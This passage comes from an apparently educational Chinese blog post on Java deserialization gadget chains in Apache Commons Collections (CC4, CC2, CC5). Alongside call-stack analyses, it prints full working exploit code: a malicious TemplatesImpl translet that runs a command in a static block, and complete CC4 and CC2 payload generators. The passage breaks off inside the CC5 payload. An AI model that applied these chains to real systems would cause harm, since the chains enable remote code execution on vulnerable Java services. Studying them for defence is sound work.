else</span><br><span class="line">        siftUp(i, e);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码中可以看出，offer 方法每被调用一次，size 都会在原来的基础上加 1 。</p><p>当然也可以使用 PriorityQueue 的 add 方法，add 方法调用了 offer 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public boolean add(E e) &#123;</span><br><span class="line">    return offer(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至于这里为什么不直接用反射修改呢，原因是 size 表示的是这个优先队列中元素的个数：</p><img src="/images/image-20240530173750752.png"><p>如果不往这个优先队列中添加元素，而是直接暴力反射修改 size 的值，那么在序列化时将会报错，导致反序列化无法进行。</p><p>具体可以看 PriorityQueue 的 writeObject 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">private void writeObject(java.io.ObjectOutputStream s)</span><br><span class="line">    throws java.io.IOException &#123;</span><br><span class="line">    // Write out element count, and any hidden stuff</span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    // Write out array length, for compatibility with 1.5 version</span><br><span class="line">    s.writeInt(Math.max(2, size + 1));</span><br><span class="line"></span><br><span class="line">    // Write out all elements in the &quot;proper order&quot;.</span><br><span class="line">    for (int i = 0; i &lt; size; i++)</span><br><span class="line">        s.writeObject(queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="PriorityQueue-readObject"><a href="#PriorityQueue-readObject" class="headerlink" title="PriorityQueue#readObject()"></a>PriorityQueue#readObject()</h6><p>PriorityQueue 的 readObject 方法调用了 heapify 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    // Read in size, and any hidden stuff</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    // Read in (and discard) array length</span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = new Object[size];</span><br><span class="line"></span><br><span class="line">    // Read in all elements.</span><br><span class="line">    for (int i = 0; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    // Elements are guaranteed to be in &quot;proper order&quot;, but the</span><br><span class="line">    // spec has never explained what that might be.</span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调用栈总结"><a href="#调用栈总结" class="headerlink" title="调用栈总结"></a>调用栈总结</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue#readObject()</span><br><span class="line">    PriorityQueue#heapify()</span><br><span class="line">        PriorityQueue#siftDown()</span><br><span class="line">            PriorityQueue#siftDownUsingComparator()</span><br><span class="line">                TransformingComparator#compare()</span><br><span class="line">                    ChainedTransformer#transform()</span><br><span class="line">                        ConstantTransformer#transform()</span><br><span class="line">                            InstantiateTransformer#transform()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                    TemplatesImpl#newTransformer()</span><br><span class="line">                                        TemplatesImpl#getTransletInstance()</span><br><span class="line">        TemplatesImpl#defineTransletClasses()</span><br><span class="line">            TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>Eval 类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class Eval extends AbstractTranslet &#123;</span><br><span class="line">    // 恶意代码放在静态代码块中</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 需要重写父类的两个方法</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class CC4 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            // 初始化 TemplatesImpl 对象</span><br><span class="line">            TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">            // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件</span><br><span class="line">            byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC2457test\\target\\classes\\com\\miaoji\\Eval.class&quot;));</span><br><span class="line">            setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);</span><br><span class="line">            // _name 不为空</span><br><span class="line">            setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">            // 利用 ChainedTransformer 执行 templates.newTransformer()</span><br><span class="line">            Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                    new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                    new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">            // 利用 TransformingComparator 执行 transform 方法</span><br><span class="line">            TransformingComparator comparator = new TransformingComparator(chainedTransformer);</span><br><span class="line"></span><br><span class="line">            // 初始化入口类 PriorityQueue</span><br><span class="line">            PriorityQueue priorityQueue = new PriorityQueue(2);</span><br><span class="line">            // 向 priorityQueue 中添加元素，使得元素个数 size 增加</span><br><span class="line">            priorityQueue.add(1);</span><br><span class="line">            priorityQueue.add(1);</span><br><span class="line"></span><br><span class="line">            // 在 add 调用完之后，再反射修改 comparator 属性为 TransformingComparator 对象</span><br><span class="line">            Object[] objects = new Object[]&#123;templates, null&#125;;</span><br><span class="line">            setFieldValue(priorityQueue, &quot;comparator&quot;, comparator);</span><br><span class="line"></span><br><span class="line">            // 序列化成字节数组</span><br><span class="line">            ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">            oos.writeObject(priorityQueue);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            // 反序列化字节数组</span><br><span class="line">            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">            ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //反射设置 Field</span><br><span class="line">    public static void setFieldValue(Object object, String fieldName, Object value) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要再说明一下，为什么不在构造方法中将 PriorityQueue 的 comparator 属性为 TransformingComparator 对象呢？因为 add 方法会提前调用 comparator.compare() ，造成序列化时命令执行，具体调用如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue#add() </span><br><span class="line"></span><br><span class="line">-&gt; PriorityQueue#offer() </span><br><span class="line"></span><br><span class="line">-&gt; PriorityQueue#siftUp() </span><br><span class="line"></span><br><span class="line">-&gt; PriorityQueue#siftUpUsingComparator() </span><br><span class="line"></span><br><span class="line">-&gt; PriorityQueue.comparator#compare()</span><br></pre></td></tr></table></figure><p>所以 payload 是在 add 方法调用完后再将 comparator 属性赋值。</p><h2 id="CC2-链"><a href="#CC2-链" class="headerlink" title="CC2 链"></a>CC2 链</h2><p>CC2 链与 CC4 链的相同之处在于它们都将 PriorityQueue 作为入口类，利用 TransformingComparator#compare() 来调用 transform 方法。不同之处在于 CC2 链用 InvokerTransformer 代替 TrAXFilter + InstantiateTransformer 来执行 TemplatesImpl#newTransformer() </p><h4 id="调用栈总结-1"><a href="#调用栈总结-1" class="headerlink" title="调用栈总结"></a>调用栈总结</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue#readObject()</span><br><span class="line">    PriorityQueue#heapify()</span><br><span class="line">        PriorityQueue#siftDown()</span><br><span class="line">            PriorityQueue#siftDownUsingComparator()</span><br><span class="line">                TransformingComparator#compare()</span><br><span class="line">                    ChainedTransformer#transform()</span><br><span class="line">                        ConstantTransformer#transform()</span><br><span class="line">                            InvokerTransformer#transform()</span><br><span class="line">                                TemplatesImpl#newTransformer()</span><br><span class="line">                                    TemplatesImpl#getTransletInstance()</span><br><span class="line">        TemplatesImpl#defineTransletClasses()</span><br><span class="line">            TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class CC2 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            // 初始化 TemplatesImpl 对象</span><br><span class="line">            TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">            // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件</span><br><span class="line">            byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC2457test\\target\\classes\\com\\miaoji\\Eval.class&quot;));</span><br><span class="line">            setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);</span><br><span class="line">            // _name 不为空</span><br><span class="line">            setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">            // 利用 ChainedTransformer 执行 templates.newTransformer()</span><br><span class="line">            Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                    new ConstantTransformer(templates),</span><br><span class="line">                    new InvokerTransformer(&quot;newTransformer&quot;, null,null)</span><br><span class="line">            &#125;;</span><br><span class="line">            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">            // 利用 TransformingComparator 执行 transform 方法</span><br><span class="line">            TransformingComparator comparator = new TransformingComparator(chainedTransformer);</span><br><span class="line"></span><br><span class="line">            // 初始化入口类 PriorityQueue</span><br><span class="line">            PriorityQueue priorityQueue = new PriorityQueue(2);</span><br><span class="line">            // 向 priorityQueue 中添加元素，使得元素个数 size 增加</span><br><span class="line">            priorityQueue.add(1);</span><br><span class="line">            priorityQueue.add(1);</span><br><span class="line"></span><br><span class="line">            // 在 add 调用完之后，再反射修改 comparator 属性为 TransformingComparator 对象</span><br><span class="line">            Object[] objects = new Object[]&#123;templates, null&#125;;</span><br><span class="line">            setFieldValue(priorityQueue, &quot;comparator&quot;, comparator);</span><br><span class="line"></span><br><span class="line">            // 序列化成字节数组</span><br><span class="line">            ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">            oos.writeObject(priorityQueue);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            // 反序列化字节数组</span><br><span class="line">            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">            ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //反射设置 Field</span><br><span class="line">    public static void setFieldValue(Object object, String fieldName, Object value) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC5-链"><a href="#CC5-链" class="headerlink" title="CC5 链"></a>CC5 链</h2><p>CC5 链将 BadAttributeValueExpException#readObject() 作为入口，利用 TiedMapEntry#tostring() 来调用 LazyMap#get() ，进而调用 transform 方法。</p><p><strong>实验环境</strong> </p><ul><li>java &#x3D; 8u65</li><li>CommonsCollections &#x3D; 3.2.1</li></ul><p>pom.xml 中导入如下依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h4 id="利用链之-TiedMapEntry"><a href="#利用链之-TiedMapEntry" class="headerlink" title="利用链之 TiedMapEntry"></a>利用链之 TiedMapEntry</h4><p>前面在使用 TiedMapEntry 时，用的是它的 getValue 方法来调用其成员属性 map 的 get 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object getValue() &#123;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TiedMapEntry 的 toString 方法又调用了 getValue 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public String toString() &#123;</span><br><span class="line">    return getKey() + &quot;=&quot; + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="入口类之-BadAttributeValueExpException"><a href="#入口类之-BadAttributeValueExpException" class="headerlink" title="入口类之 BadAttributeValueExpException"></a>入口类之 BadAttributeValueExpException</h4><p>BadAttributeValueExpException 的 readObject 方法调用了 valObj 的 toString 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(&quot;val&quot;, null);</span><br><span class="line"></span><br><span class="line">    if (valObj == null) &#123;</span><br><span class="line">        val = null;</span><br><span class="line">    &#125; else if (valObj instanceof String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; else if (System.getSecurityManager() == null</span><br><span class="line">            || valObj instanceof Long</span><br><span class="line">            || valObj instanceof Integer</span><br><span class="line">            || valObj instanceof Float</span><br><span class="line">            || valObj instanceof Double</span><br><span class="line">            || valObj instanceof Byte</span><br><span class="line">            || valObj instanceof Short</span><br><span class="line">            || valObj instanceof Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix</span><br><span class="line">        val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看看 valObj 是怎么来的：</p><p><code>ObjectInputStream.GetField gf = ois.readFields();</code> </p><ul><li>ois：一个 ObjectInputStream 实例，用于从输入流中读取对象。</li><li>readFields()：读取对象的字段，并返回一个 ObjectInputStream.GetField 对象，这个对象包含了序列化对象的字段和值。</li></ul><p><code>Object valObj = gf.get(&quot;val&quot;, null);</code> </p><ul><li>gf：前面获取的 ObjectInputStream.GetField 对象。</li><li>get(“val”, null)：从 gf 中获取名为 val 的字段值。如果 val 字段不存在，则返回 null。</li></ul><p>所以说，valObj 的值就是 val 的值，而 val 是 BadAttributeValueExpException 中定义的属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private Object val;</span><br></pre></td></tr></table></figure><p>所以我们只需要将 val 赋值成 TiedMapEntry 对象即可。</p><p>但是我们并不能用构造方法赋值，因为构造方法会提前调用 val 的 toString 方法，造成命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public BadAttributeValueExpException (Object val) &#123;</span><br><span class="line">    this.val = val == null ? null : val.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以这里选择反射修改 val 的值。</p><p>再来看判断，调用 valObj.toString() 的前提是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">System.getSecurityManager() == null</span><br><span class="line">            || valObj instanceof Long</span><br><span class="line">            || valObj instanceof Integer</span><br><span class="line">            || valObj instanceof Float</span><br><span class="line">            || valObj instanceof Double</span><br><span class="line">            || valObj instanceof Byte</span><br><span class="line">            || valObj instanceof Short</span><br><span class="line">            || valObj instanceof Boolean</span><br></pre></td></tr></table></figure><p>这个式子返回 true 。若 valObj 为 TiedMapEntry 对象，则所有的 instanceof 判断均为 false 。System.getSecurityManager() 作用是获取当前 Java 虚拟机 (JVM) 安装的 SecurityManager（ Java 中的一种安全机制，用于在运行时对代码进行安全检查），默认情况下是没有安装的，所以返回 null ，那么上述判断默认情况下为 true 。</p><p>当然也就可以知道：理论上，如果受害者安装了 SecurityManager ，CC5 链就行不通。</p><h4 id="调用栈总结-2"><a href="#调用栈总结-2" class="headerlink" title="调用栈总结"></a>调用栈总结</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException#readObject()</span><br><span class="line">    TiedMapEntry#toString()</span><br><span class="line">        TiedMapEntry#getValue()</span><br><span class="line">            LazyMap#get()</span><br><span class="line">                ChainedTransformer#transform()</span><br><span class="line">                    ConstantTransformer#transform()</span><br><span class="line">                        InvokerTransformer#transform()</span><br><span class="line">                        Runtime#exec()</span><br></pre></td></tr></table></figure><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p>CC5 链还是采用 InvokerTransformer 命令执行的办法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import 